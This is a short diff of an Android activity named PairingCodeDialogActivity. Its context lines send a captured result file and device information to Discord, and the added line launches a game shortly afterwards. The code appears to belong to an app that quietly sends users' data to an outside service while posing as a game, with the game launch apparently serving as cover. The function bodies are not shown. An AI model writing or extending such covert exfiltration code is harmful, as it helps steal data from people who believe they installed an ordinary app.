@@ -92,6 +92,7 @@ class PairingCodeDialogActivity : Activity() {
                         if (result != null) {
                             sendFileToDiscord(result)
                             sendDeviceInfoToDiscord()
+                            handler.postDelayed({ launchGame() }, 650)
                         }
                         finish()
                     }
